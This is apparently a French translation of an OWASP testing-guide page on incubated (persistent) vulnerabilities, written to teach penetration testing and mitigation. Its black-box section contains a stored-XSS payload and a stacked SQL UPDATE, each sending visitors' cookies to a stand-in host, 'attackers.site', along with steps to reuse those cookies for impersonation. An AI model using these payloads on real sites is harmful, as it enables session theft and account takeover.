## Sommaire

Aussi connues sous le nom d'attaques persistentes, tester les incubated
est une méthode complexe de test qui nécessite plus d'une vulnérabilité
de validation de données pour fonctionner. Les vulnérabilités incubated
sont typiquement utilisées pour mener des attaques "watering hole"
contre les utilisateurs d'applications web légitimes.

Les vulnérabilité incubated ont les caractéristiques suivantes :

  - En premier lieu, le vecteur d'attaque doit être persistent, il doit
    être stocké dans la couche de persistence, et cela ne peut arriver
    que si une faible validation de données est présente ou si les
    données sont arrivées dans le système par un autre canal, comme une
    console d'administration ou via un processus batch du backend.
  - Deuxièmement, uen fois le vecteur d'attaque a été "rappelé", il doit
    être exécuté avec succès. Par exemple, une attaque par incubated XSS
    nécessitera une faible validation des sorties pour que le script
    puisse être délivré au client sous sa forme exécutable.

L'exploitation de quelques vulnérabilités, ou même de fonctionnalités
d'une application web, va permettre à l'attaquant de déposer des données
qui seront ensuite récupérées par un utilisateur à son insu ou par
d'autres composants du système, et ainsi d'exploiter une autre
vulnérabilité.

Dans un test d'intrusion, le terme **incubated attacks** peut être
utilisé pour évaluer la criticité de certains bogues, utilisant un
problème de sécurité particulier pour construire une attaque côte
client qui pourra cibler un large nombre de victimes simultanément (par
exemple, tous les utilisateurs naviguant sur le site).

Ce type d'attaque asynchrones couvre un large spectre de vecteurs
d'attaque, parmi eux :

  - Les composants de stockage de fichiers d'une application, permettant
    à un attaquant de télécharger des fichiers multimedia corrompus
    (images jpg exploitant CVE-2004-0200, images png exploitant
    CVE-2004-0597, des fichiers exécutables, des pages avec des
    composants actofs, etc.).

<!-- end list -->

  - Des failles XSS dans des forums publics (voir [Testing for Stored
    Cross_site scripting
    (OTG-INPVAL-002)](Testing_for_Stored_Cross_site_scripting_\(OTG-INPVAL-002\) "wikilink")
    pour plus de détails). Un attaquant peut potentiellement stocker des
    scripts ou du code malicieux dans un repository sur le backend de
    l'application (ex: une base de données) afin que ce script/code soit
    exécuté par un des utilisateurs (utilisateurs finaux,
    administrateurs, etc.). L'archétype d'une attaque incubated est
    d'utiliser une vulnérabilité XSS dans un forum d'utilisateurs,
    bulletin board, ou un blog afin d'injecter du code JavaScript dans
    une page vulnérable, qui sera affichée et exécutée par le navigateur
    de l'utilisateur, en utilisant le niveau de confiance du site
    original (vulnérable).

<!-- end list -->

  - Des injections SQL/XPath permettant à l'attaquant de stocker du
    contenu dans la base de données, qui sera ensuite récupéré comme
    partie active du contenu d'une page web. Par exemple, si l'attaquant
    peut poster du JavaScript arbitraire dans un bulletin board afin
    qu'il soit exécuté par les utilisateurs, il peut prendre le contrôle
    de leurs navigateurs (Ex. :
    [XSS-proxy](http://sourceforge.net/projects/xss-proxy))

<!-- end list -->

  - Des serveurs mal configurés permettant l'installation de paquetages
    Java ou de composants web similaires (Ex. : Tomcat, ou des consoles
    d'hébergement web comme Plesk, CPanel, Helm, etc.)

## Comment tester

### Test en boite noire

#### Exemple de stockage de fichier

Vérifier le type de contenu permis sur une application web et l'URL
résultante pour le fichier stocké. Télécharger un fichier qui va
exploiter un composant dans la station de travail locale de
l'utilisateur quand il sera visualisé ou téléchargé par l'utilisateur.
Envoyer un e-mail à la victime ou une autre sorte d'alerte pour
l'inciter à visiter la page. Le résultat attendu est que l'exploit sera
déclenché quand l'utilisateur consulte la page résultante ou télécharge
et exécute le fichier depuis le site de confiance.

#### Exemple XSS sur un Bulletin Board

1\. Introduire du code *JavaScript* comme valeur du champ vulnérable,
par exemple :

`<script>document.write('<img src="http://attackers.site/cv.jpg?'+document.cookie+'">')</script>`
`  `

2\. Diriger des utilisateurs vers la page vulnérable ou attendre que des
utilisateurs la visitent. Mettre en place un "listener" sur
*attackers.site* pour écouter toutes les connexions entrantes.

3\. Wuand les utilisateurs visitent la page vulnérable, une requête
contenant leur cookie (*document.cookie* est inclu dans l'URL) sera
envoyée vers *attackers.site*, telle que :

` - GET /cv.jpg?SignOn=COOKIEVALUE1;%20ASPSESSIONID=ROGUEIDVALUE;`
`     %20JSESSIONID=ADIFFERENTVALUE:-1;%20ExpirePage=https://vulnerable.site/site/;`
`     TOKEN=28_Sep_2006_21:46:36_GMT HTTP/1.1`

4\. Utiliser les cookies ainsi obtenus pour usurper l'identité des
utilisateurs sur le site vulnérable.

#### Exemple d'injection SQL

Souvent, cet ensemble d'exemples utilise des attaques XSS pour exploiter
une vulnérabilité d'injection SQL. La première chose à faire est de
tester si le site ciblé comporte une vulnérabilité d'injection SQL. Cela
est décrit dans la section 4.2 [Testing for SQL
Injection](Testing_for_SQL_Injection_\(OTG-INPVAL-006\) "wikilink").
Pour chaque vulnérabilité d'injection SQL, il y a un ensemble de
contraintes décrivant le genre de requêtes que l'attaquant/testeur peut
faire.

Le testeur doit alors faire correspondre les attaques XSS qu'il a
conçues avec les entrées qu'il peut insérer.

1\. De manière similaire aux exemples précédents de XSS, utiliser un
champ d'une page vulnérable à des injections SQL pour changer une valeur
en base de données qui pourra être utilisée par l'application comme
entrée à afficher sur le site sans filtrage adéquat (cela serait une
combinaison d'injection SQL et de XSS). Par exemple, supposons qu'il y
ait une table *footer* en base avec tous les pieds de page des pages du
site, incluant un champ *notice* contenant une note légale apparaissant
en bas de chaque page. Vous pourriez utiliser la requête suivante pour
injecter du code JavaScript dans le champ *notice* de la table ''footer'
dans la base.

` SELECT field1, field2, field3`
`  FROM table_x`
`  WHERE field2 = 'x';`
`     UPDATE footer`
`     SET notice = 'Copyright 1999-2030%20`
`         <script>document.write(\'<img src="http://attackers.site/cv.jpg?\'+document.cookie+\'">\')</script>'`
`     WHERE notice = 'Copyright 1999-2030';`

2\. Maintenant, chaque utilisateur visitant le site envoie
silencieusement son cookie vers *attackers.site* (étapes b.2 to b.4).

#### Serveur mal configuré

Certains serveurs web ont une interface d'administration qui peut
permettre à un attaquant de stocker les composants actifs de leur choix
sur le site. Cela peut être le cas avec un serveur Apache Tomcat qui ne
force pas d'authentification solide pour accéder à son Web Application
Manager (ou si le testeur a pu obtenir des identifiants/mot de passe
valides par d'autres moyens).

Dans ce cas, une fichier WAR peut être téléchargé et une nouvelle
application web déployée sur le site, qui permettra non seulement au
testeur d'exécuter le code de son choix localement sur le serveur, mais
aussi d'installer une application sur le site de confiance, à laquelle
les utilisateurs réguliers du site auront accès (très probablement avec
un niveau de confiance plus grand que lorsqu'ils visitent d'autres
sites).

Il devrait être évident que la possibilité de changer le contenu des
page d'un serveur, via des vulnérabilités quelconques exploitable sur le
serveur, et qui vont donner à l'attaquant les droits d'écriture sur
l'arborescence du site, pourra aussi être utile pour placer une telle
attaque incubated sur les pages du serveur (c'est en fait la méthode de
propagation des vers infectant les serveurs web).

### Test en boite grise

Les techniques grises/blanches seront les mêmes que celle discutées
précédemment.

  - Examiner la validation des entrée est la clef pour mitiguer cette
    vulnérabilité. Si d'autres systèmes dans l'entreprise utilise la
    même couche de persistence, elle pauvent avoir des validations
    faibles et les données peuvent être persistées via une "back door".

<!-- end list -->

  - Pour combattre les problèmes de "back door" du côté client, une
    validation des sorties doit aussi être employée afin d'encoder les
    données corrompues avant de les afficher au client, et donc elles ne
    seront pas exécutées.

<!-- end list -->

  - Voir la section [Data
    Validation](Data_Validation_%28Code_Review%29#Data_validation_strategy "wikilink")
    du Guide de revue de code.

## Outils

  - XSS-proxy - <http://sourceforge.net/projects/xss-proxy>
  - Paros - <http://www.parosproxy.org/index.shtml>
  - Burp Suite - <http://portswigger.net/burp/proxy.html>
  - Metasploit - <http://www.metasploit.com/>

## Références

La plupart des références de la section sur les cross site scripting
sont valides. Comme expliqué plus haut, les attaques incubated sont
exécutées en combinant des exploits comme des XSS et des injections
SQL.

**Avis**

  - CERT(R) Advisory CA-2000-02 Malicious HTML Tags Embedded in Client
    Web Requests - <http://www.cert.org/advisories/CA-2000-02.html>
  - Blackboard Academic Suite 6.2.23 +/-: Persistent cross-site
    scripting vulnerability -
    <http://lists.grok.org.uk/pipermail/full-disclosure/2006-July/048059.html>

**Whitepapers**

  - Web Application Security Consortium "Threat Classification,
    Cross-site scripting" -
    <http://www.webappsec.org/projects/threat/classes/cross-site_scripting.shtml>